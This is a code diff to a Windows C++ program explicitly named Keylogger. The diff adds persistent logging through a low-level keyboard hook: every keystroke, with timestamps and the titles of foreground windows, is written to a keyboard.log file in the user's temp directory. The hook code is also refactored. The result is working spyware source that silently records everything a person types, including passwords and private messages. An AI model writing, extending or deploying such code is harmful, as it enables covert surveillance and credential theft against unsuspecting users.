@@ -46,6 +46,9 @@ const map<int, string> KEYS{
 	{VK_F12, "[F12]"},
 };
 HHOOK _hook;
+fstream logFile;
+char filename[256];
+char previousW[256];
 
 // Save func prototype. Processed and save data
 int Save(KBDLLHOOKSTRUCT& kbData);
@@ -60,6 +63,9 @@ LRESULT CALLBACK KeyboardProc(
 	LPARAM lParam // extended info about wParam
 );
 
+bool CALLBACK SetKeyboardHook();
+void CALLBACK UnhookKeyboardHook();
+
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0 && wParam == WM_KEYDOWN) {
@@ -69,29 +75,43 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-
-void SetKeylogHook()
+bool CALLBACK SetKeyboardHook()
 {
-	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)))
-		MessageBox(NULL, L"0x00FF512 Failed!", NULL, MB_ICONERROR);
+	if (!_hook)
+		_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+	return _hook ? TRUE : FALSE;
 }
+
+void CALLBACK UnhookKeyboardHook()
+{
+	if (_hook)
+		UnhookWindowsHookEx(_hook);
+	_hook = NULL;
+}	
 
 void Keylogger()
 {
 	MSG msg;
-	SetKeylogHook();
+	SetKeyboardHook();
 	while (GetMessage(&msg, NULL, 0, 0)) {
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
-	UnhookWindowsHookEx(_hook);
+	UnhookKeyboardHook();
 }
 
+void SetFilename()
+{
+	char* pValue;;
+	size_t len;
+	_dupenv_s(&pValue, &len, "temp");
+	strcpy_s(filename, 256, pValue);
+	strcat_s(filename, 256,"\\keyboard.log");
+}
 
 int Save(KBDLLHOOKSTRUCT& kbData)
 {
 	int key = kbData.vkCode;
-	char previousW[256] = "";
 
 	if (key == 1 || key == 2)
 		return 0;
@@ -104,13 +124,20 @@ int Save(KBDLLHOOKSTRUCT& kbData)
 		char currentW[256];
 		GetWindowTextA(foregroundW, currentW, sizeof(currentW) / sizeof(char));
 		time_t timestamp = time(NULL);
+
+		if (!logFile.is_open()) {
+			logFile.open(filename, ios::app);
+		}
+		
 		if (strcmp(currentW, previousW)) {
 			strcpy_s(previousW, sizeof(previousW), currentW);
 			// Save to log new program this
+			logFile << "[" << currentW << "|" << timestamp << "]\n";
 		}
 		if (KEYS.find(key) != KEYS.end()) {
 			cout << key << " => " << KEYS.at(key) << endl;
 			// Log data this
+			logFile << timestamp << "|" << KEYS.at(key) << '\n';
 		}
 		else {
 			unsigned char keyboardState[256];
@@ -123,14 +150,19 @@ int Save(KBDLLHOOKSTRUCT& kbData)
 				WideCharToMultiByte(CP_ACP, 0, &wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0); // Unicode to ANSI
 				cout << wbuffer << " => " << buffer << endl;
 				// Log data this
+				logFile << timestamp << "|" << buffer << '\n';
 			}
 		}
+		logFile.close();
 	}
 	return 0;
 }
 
+
+
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
+	SetFilename();
 	Keylogger();
 }
 
